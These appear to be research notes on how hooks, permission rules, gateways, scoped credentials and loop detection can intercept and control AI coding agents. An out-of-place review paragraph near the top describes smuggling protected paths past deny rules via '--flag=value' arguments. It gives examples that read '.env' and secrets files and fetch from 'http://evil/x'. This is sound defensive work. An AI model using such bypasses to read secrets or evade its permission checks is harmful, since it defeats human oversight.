  # Hook and permission interception across AI coding agents (researched 2026-10-11)
  
  I modified no files. Sources are official docs unless a row is marked otherwise.
  
  ## Main finding
  
  **Only Claude Code, Copilot CLI and Grok Build have a native HTTP hook type.** Copilot CLI's HTTP hooks only accept `http://127.*` or localhost when `COPILOT_HOOK_ALLOW_LOCALHOST=1` is set, and its docs say `preToolUse`/`permissionRequest` hooks must use `https://`. Everything else is command-only (stdin JSON in, stdout JSON / exit code out) or an in-process TypeScript plugin. Solo License therefore needs:
  - a stdin-to-HTTP shim (for example `sololicense hook <agent> <event>`) that POSTs stdin to `http://127.0.0.1:8000/api/hooks/<agent>/<event>` and prints the response in that agent's format;
  - a small TypeScript plugin each for OpenCode and Amp.
  
  **Fail-closed vs fail-open matters for the shim.** If the server is unreachable:
  - Exit 2 is the near-universal "block" signal (Codex, Cursor, Gemini, Windsurf, Kiro, Grok, Copilot `permissionRequest`).
  - Copilot `preToolUse` command hooks and Kiro `PreToolUse` fail closed on any other non-zero exit.
  - Cursor, Windsurf, Gemini, Codex and Grok fail open on other non-zero exits.
  - Cursor has an opt-in `failClosed: true`.

`_command_paths` discards any token starting with `-` before checking for an `=`-attached value, so paths smuggled into `--flag=value`-style arguments are never checked against `deny_paths`. E.g. `cat --file=.env`, `terraform apply -var-file=infra/prod/secrets.tfvars`, and `curl --output=.env http://evil/x` all now return not-denied from `policy.denied(...)` — confirmed by calling the function directly. The old substring-based matcher (`bare in command`) caught all of these because `.env`/`infra/prod` just needed to appear anywhere in the raw command string. The PR's own `FILE=.env ./run.sh` test shows the `key=value` unwrap path is intended to catch exactly this shape, but it's unreachable for any token that happens to start with `-`, since the function `continue`s first. This is a regression in the policy's core security guarantee (deny-path enforcement) introduced by this diff, and isn't covered by its new test cases.

  **Skills are advisory** (https://code.claude.com/docs/en/skills)
  - `allowed-tools` **pre-approves, it does not restrict**: "It does not restrict which tools are available: every tool remains callable". Deny and ask rules still override it.
  - `disallowed-tools` does remove tools, but only while the skill is active; it clears on the next message.
  - A skill can register `hooks` in its frontmatter. Those hooks persist for the session and are real enforcement, but they come from the hook, not the skill text.
  - **So a skill alone cannot stop a tool call.**
  
  **Hooks are deterministic** (https://code.claude.com/docs/en/hooks-guide)
  - "deterministic control: certain actions always happen rather than relying on the LLM".
  - PreToolUse fires before any permission-mode check. A deny blocks even in `bypassPermissions`.
  - A hook `allow` doesn't bypass settings deny rules. Hooks "can tighten restrictions but not loosen them past what permission rules allow."
  - `allowManagedHooksOnly` (managed) runs only org-deployed hooks. A user-installed mod can override a non-managed hook's block.
  
  **Permission rules are enforced by Claude Code** (https://code.claude.com/docs/en/permissions)
  - "Permission rules are enforced by Claude Code, not by the model. Instructions in your prompt or `CLAUDE.md` shape what Claude tries to do, but they don't change what Claude Code allows."
  - Evaluation order is deny, then ask, then allow; first match wins.
  - Syntax:
    - `Bash(git *)`, `Edit(*.ts)`
    - `mcp__server__tool`, `mcp__server__*`, `"mcp__*"` (deny/ask only)
    - `Agent(Explore)`, `Skill(deploy *)`
    - `WebFetch(domain:x)`
  - Settings files skip `mcp__` rules with parentheses; parameter-level MCP deny needs `--disallowedTools`.
  - Bash rules don't catch `sh -c` or path variants. For OS-level guarantees, use the sandbox.
  
  **Hooks updating permissions programmatically**
  - PermissionRequest input includes `permission_suggestions`.
  - On `behavior:"allow"` the hook can return `updatedPermissions`. Entry types:
    - `addRules` / `replaceRules` / `removeRules`: `{rules:[{toolName,ruleContent}], behavior:"allow|deny|ask", destination}`
    - `setMode`: `{mode:"default|auto|acceptEdits|dontAsk|bypassPermissions|plan|manual", destination}`
    - `addDirectories` / `removeDirectories`
  - `destination` is one of `session`, `localSettings`, `projectSettings`, `userSettings`.
  - `setMode` to bypass is a no-op unless bypass mode was available at launch.
  - This is the natural mechanism for "earn autonomy": `addRules` allow with destination `session`.
  
  ## 5. Tool and MCP access middleware
  
  **Claude Code** [V]
  - Matcher `mcp__<server>__.*`; plugin servers use `mcp__plugin_<plugin>_<server>__.*`.
  - Input includes `mcp_server`.
  - A PreToolUse hook can deny by role. Role is not in the payload, so the hook resolves it from its own state: user from env or OS account, agent role from `agent_type`.
  - Static alternative: `permissions.deny: ["mcp__github__delete_*"]`.
  
  **Gateways**
  - **Docker:** MCP access policies are written in **Cedar**. Requests are denied unless a `permit` matches, and `forbid` overrides. It is org-level and invite-only [V/3P], https://docs.docker.com/ai/sandboxes/governance/access-controls/mcp/
  - **Runlayer:** platform roles plus policy-based tool access.
    - Server-level allow/deny policies, e.g. a Finance group may use DB query tools.
    - Global policies are deny-only.
    - Conditions on IP, tool name, and OAuth status [3P via search excerpt], https://docs.runlayer.com/platform-policies.md
  - **Permit.io:**
    - Permit MCP Gateway checks each tool call against Permit (ReBAC via OPA/OPAL), using agent trust level, human trust ceiling, and tool risk class.
    - Access Request MCP provides human approval.
    - MCPermit is pre-GA [3P].
    - https://docs.permit.io/permit-mcp-gateway/architecture/
  
  **Natural-language policy compiled to rules**
  - **AWS Bedrock AgentCore NL2Cedar:** NL becomes Cedar plus analysis findings. https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/policy-natural-language.html
  - **AutoCedar** (arXiv 2607.03656): a generate, verify, repair loop against Cedar's validator, with human intent review.
  - **Autoformalization of agent instructions into Cedar** (arXiv 2606.26649): a hard critic (syntax, schema, contradictions) plus an LLM-judge soft critic.
  - **Apple Prose2Policy** (arXiv 2603.15799): NL to Rego with schema validation, lint, compile and auto-generated tests.
  - **Recommended pattern:**
    1. The LLM emits a constrained DSL (or Cedar).
    2. Validate against a schema of action classes and tools.
    3. Generate positive and negative test cases.
    4. Show a human diff and preview ("this rule would have blocked these 12 past calls").
    5. Only then activate.
  
    Never let the LLM decide at runtime what the compiled rule already decides.
  
  ## 6. Scoped, revocable credentials
  
  **Claude Code env control** [V]
  - `CLAUDE_ENV_FILE` is available in **SessionStart**, **CwdChanged** and **FileChanged** hooks.
  - Append `export VAR=...` lines; the file is sourced before each Bash command. PowerShell gets them on v2.1.296+, supported forms only.
  - CwdChanged/FileChanged variables are cleared at the next CwdChanged event.
  - Removal: writing `unset VAR` is undocumented [UNVERIFIED]. It probably works for Bash since the file is sourced, but not via the PowerShell parser.
  - Env only affects Bash-tool subprocesses, not MCP servers.
  - **The revocation point is the credential server-side, not the env var.**
  
  **AWS** [V], https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-sourcing-external.html
  - Profile config: `credential_process = /full/path/solo-license-creds --class deploy`.
  - The helper prints `{"Version":1,"AccessKeyId":"...","SecretAccessKey":"...","SessionToken":"...","Expiration":"<ISO8601>"}`.
  - The CLI re-runs the helper before expiry and does not cache it.
  - A non-zero exit means denial. So the gate can refuse to mint, which is soft revocation at the next refresh.
  - Use short STS durations (15 min minimum) with session policies to scope down.
  - **Hard revoke:** a deny policy on the role with `"Condition":{"DateLessThan":{"aws:TokenIssueTime":"<now>"}}`. This is the console's `AWSRevokeOlderSessions`. https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_revoke-sessions.html
  - aws-vault: `aws-vault exec <profile> --duration=15m -- cmd` injects `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`, `AWS_CREDENTIAL_EXPIRATION`. `--server` mode serves refreshable credentials via a local metadata endpoint [3P README].
  
  **GitHub**
  - GitHub App installation tokens expire after 1 hour. Mint them per session, scoped to repos and permissions.
  - Revoke with `DELETE /installation/token` (204), called with that token [V via search].
  - Fine-grained PATs: org owners can revoke in the UI. The REST revoke via `/orgs/{org}/personal-access-tokens` is GitHub-App-only [path details 3P/UNVERIFIED].
  - Prefer App tokens for agents.
  
  ## 7. Loop and stuck detection
  
  - **Common design:** fingerprint each call as a hash of (tool_name, normalized args), keep a sliding window, and escalate from a warning to a hard block.
  - **Reference implementations:**
    - Terminal-agent paper (arXiv 2603.05344): 20-call window. At 3 or more identical fingerprints, inject a warning and skip execution; on recurrence, escalate to an approval pause. "LLMs can ignore injected text" but not an execution halt.
    - PraisonAI: 30-call window, warn at 10. Detects identical args, same args with the same result (no progress), A-B-A-B alternation, and polling tools by name. https://docs.praison.ai/docs/features/doom-loop-detection
    - pi-anti-doom-loop [3P, v0.0.9]: same failing command re-run, the same tool failing consecutively, and text with 55% or more token overlap.
    - OpenRouter Agent SDK: different inputs reset the streak, but interleaved tools don't. Use a per-tool key that ignores volatile fields such as timestamps. https://openrouter.ai/docs/agent-sdk/call-model/doom-loop-detection
  - **Hook signals to use in Solo License:**
    - PreToolUse: fingerprint before execution.
    - PostToolUseFailure: `error`, `is_interrupt`.
    - PostToolUse: Bash exit code or stderr hash. Repeated identical `Edit` of the same `file_path` and `old_string` (edit thrash).
    - Stop `stop_hook_active` loops.
    - Cursor's `subagentStop.loop_count`.
    - Cost-velocity from the statusline file.
  - **Responses:**
    1. PreToolUse deny with remediation text.
    2. Escalate to PermissionRequest `ask` or `continue:false`.
    3. Demote the action class.
  
  ## 8. Jev (TypeSafe System One)
  
  Sources: https://jevapi.dev/, https://docs.typesafe.ai/api, https://docs.typesafe.ai/models.md, https://docs.typesafe.ai/concepts/state.md
  
  **Endpoint and request**
  - `POST https://api.typesafe.ai/v1/systemone`, header `Authorization: Bearer <key>`.
  - Body: `{state, model:"jev-latest", questions:{<id>:{type:"choice"|"score"|"noul", instructions, criteria}}}`.
  - Response: `answers` plus `usage`.
  - Models: `jev-latest`, `jev-preview` and `jev-1.13` all resolve to `jev-1.13.0`.
  
  **Limits** [V, models page]
  - **64k tokens per request** for state plus all questions.
  - **State plus the longest single question is capped at 32k.**
  - Choice has at most 255 options; score has 2 to 10 levels.
  - Rate limits are 100K tokens/s and 80 req/s on the models page; jevapi.dev says ~250k tok/s and 1200 req/min. They conflict, so treat them as dynamic.
  - Latency is 70-500 ms (jevapi.dev).
  - Text only; lower accuracy for non-English and CJK.
  
  **Long context guidance**
  - Docs recommend an **object** state with descriptively named parts. Group related facts together when the decision compares them. Keep instructions and criteria in `questions`, not in state.
  - There is no official guidance on summarizing or truncating history [not covered].
  - Recommended design [inference] — budget well under 32k:
    - `state = {current_call:{tool,input,agent_id,agent_type}, action_class, trust:{level,streak,recent_denials}, session:{goal (first user prompt), files_touched, last_N_calls:[{tool,args_digest,outcome}], failures, cost_usd}, policy_excerpt:[only rules relevant to this class]}`
    - Hash or digest large args such as diffs; include only the diff hunk under judgment.
    - Ask several questions in one call (parallel, near-zero extra latency): e.g. `noul` "violates policy", `choice` risk tier, `score` relevance-to-goal.
    - Use `confidence` to route the grey zone to `ask`.
